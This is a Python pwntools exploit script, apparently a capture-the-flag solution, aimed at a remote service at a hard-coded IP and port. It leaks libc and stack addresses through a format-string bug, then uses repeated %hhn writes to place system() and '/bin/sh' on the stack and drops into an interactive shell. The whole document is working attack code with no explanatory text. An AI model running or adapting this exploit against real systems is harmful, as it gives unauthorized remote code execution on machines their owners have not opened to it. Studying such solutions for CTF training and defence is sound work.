from pwn import *
def lv_up(num):
	while(num<0 or num > 255):
		if(num<0):
			num=num+256;
		if(num>255):
			num=num-256;
	return num;
'''
elf=ELF('/lib/i386-linux-gnu/libc.so.6')
p=process('./4-4')
'''
elf=ELF('./libc6_2.23-0ubuntu9_i386.so')
p=remote('121.42.189.18',10009)
#'''
print p.recvline();
print p.recvline();
print p.recvline();
payload='%15$p%6$p'
p.sendline(payload)
data=p.recvuntil('8\n')
im=0xf7
im2=0xf3
leak_libc=int(data[:10],16)
leak_stack=int(data[10:-1],16)
log.info("leak_libc:%s",hex(leak_libc))
log.info("leak_stack:%s",hex(leak_stack))
leakfunc=leak_libc-im
base=leakfunc-elf.symbols['__libc_start_main']
elf.address=base
system=elf.symbols['system']
bash= elf.search('/bin/sh').next()
s1=system&0xff
s2=system&0xff00
s2=s2>>8
s3=system&0xff0000
s3=s3>>16
s4=system&0xff000000
s4=s4>>24
b1=bash&0xff
b2=bash&0xff00
b2=b2>>8
b3=bash&0xff0000
b3=b3>>16
b4=bash&0xff000000
b4=b4>>24
off=leak_stack&0xff;
off=off-16;
payload="%c%c%c%c%{}c%hhn%{}c%10$hhn".format(off,lv_up(s1-off-4))
p.sendline(payload)
p.recv()
off+=1;
payload="%c%c%c%c%{}c%hhn%{}c%10$hhn".format(off,lv_up(s2-off-4))
p.sendline(payload)
p.recv()
off+=1;
payload="%c%c%c%c%{}c%hhn%{}c%10$hhn".format(off,lv_up(s3-off-4))
p.sendline(payload)
p.recv()
off+=1;
payload="%c%c%c%c%{}c%hhn%{}c%10$hhn".format(off,lv_up(s4-off-4))
p.sendline(payload)
p.recv()
off+=5;
payload="%c%c%c%c%{}c%hhn%{}c%10$hhn".format(off,lv_up(b1-off-4))
p.sendline(payload)
p.recv()
off+=1;
payload="%c%c%c%c%{}c%hhn%{}c%10$hhn".format(off,lv_up(b2-off-4))
p.sendline(payload)
p.recv()
off+=1;
payload="%c%c%c%c%{}c%hhn%{}c%10$hhn".format(off,lv_up(b3-off-4))
p.sendline(payload)
p.recv();
off+=1;
payload="%c%c%c%c%{}c%hhn%{}c%10$hhn".format(off,lv_up(b4-off-4))
p.sendline(payload)
p.recv()
p.sendline("quit");
p.interactive();



